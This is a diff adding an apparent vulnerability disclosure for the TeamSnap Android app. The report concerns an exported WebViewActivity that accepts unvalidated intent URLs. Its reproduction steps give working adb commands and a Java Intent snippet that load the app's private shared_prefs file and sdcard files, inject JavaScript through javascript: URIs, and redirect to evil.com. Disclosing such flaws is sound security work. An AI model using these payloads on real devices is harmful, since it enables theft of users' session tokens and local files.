@@ -1,0 +1,81 @@
+com.teamsnap.teamsnap/com.teamsnap.core.activities.WebViewActivity -e url file:///data/data/com.teamsnap.teamsnap/shared_prefs/teamsnap_preferences.xml
+
+com.teamsnap.teamsnap/com.teamsnap.core.activities.WebViewActivity -e url https://google.com
+
+==========
+teamsnap(Android): Vulnerable to local file steal, Javascript injection, Open redirect
+++++++++++++++++++++++++++++++++++++++
+teamsnap(Android - latest version of mobile application): Vulnerable to local file steal, Javascript injection, Open redirect 
+
+  
+
+Asset 		: 	com.teamsnap.teamsnap(Android: Play Store) 
+
+Weakness 	: 	Improper Access Control 
+
+Severity	:	Critical (9 ~ 10) 
+ 
+
+Summary: com.teamsnap.teamsnap/com.teamsnap.core.activities.WebViewActivity doesn't validate data pass to intent due to which this activity is vulnerable to steal users local files, javascript injection and open redirect. 
+
+Description: com.teamsnap.teamsnap/com.teamsnap.core.activities.WebViewActivity is not set to "exported=true/false" so external app can communicate with it. As this activity doesn't validate data pass through intent critical URI like javascript and file, so malicious app can steal users files as well as inject javascript. 
+
+It can leads to many issue like UXSS, Token steal, Access / Auth control bypass, etc. 
+
+  
+
+Steps to Reproduce: 
+
+To reproduce we use ADB tool 
+
+1. To reproduce local file access use:  
+
+a) Reveal token/session etc. :  
+
+am start -n com.teamsnap.teamsnap/com.teamsnap.core.activities.WebViewActivity -e url  'file:///data/data/com.teamsnap.teamsnap/shared_prefs/teamsnap_preferences.xml' 
+
+b) Also can access '/sdcard' data, if permitted 
+
+am start -n com.teamsnap.teamsnap/com.teamsnap.core.activities.WebViewActivity -e url  'file:///sdcard/personal_data.txt' 
+
+  
+2. To reproduce javascript injection (UXSS):  
+
+a) XSS trigger: 
+
+ am start -n com.teamsnap.teamsnap/com.teamsnap.core.activities.WebViewActivity -e url  "javascript://example.com%0A alert('');" 
+
+  
+b) Addition Javascript Injections can be performed 
+
+loop through each of the window elements stored in the webview: 
+
+am start -n com.teamsnap.teamsnap/com.teamsnap.core.activities.WebViewActivity -e url  "javascript://google.com%0Ajavascript:Object.getOwnPropertyNames(window).forEach(function(v%2C%20x)%20%7B%20document.writeln(v)%3B%20%7D)%3B" 
+
+At the bottom of the response there is an element called "URL"(for example): 
+
+am start -n com.teamsnap.teamsnap/com.teamsnap.core.activities.WebViewActivity -e url  "javascript://google.com%0Ajavascript:Object.getOwnPropertyNames(window.URL).forEach(function(v%2C%20x)%20%7B%20document.writeln(v)%3B%20%7D)%3B" 
+
+  
+
+3. To reproduce open redirect:  
+
+am start -n com.teamsnap.teamsnap/com.teamsnap.core.activities.WebViewActivity -e url  "https://evil.com" 
+
+  
+
+Also the attacker can use malicious app, please see below snippet to reproduce: 
+
+Intent intent = new Intent(); 
+
+intent.setClassName("com.teamsnap.teamsnap", "com.teamsnap.core.activities.WebViewActivity"); 
+
+intent.setData(Uri.parse("file:///data/data/com.teamsnap.teamsnap/shared_prefs/teamsnap_preferences.xml")); 
+
+startActivity(intent); 
+
+
+
+
+
+
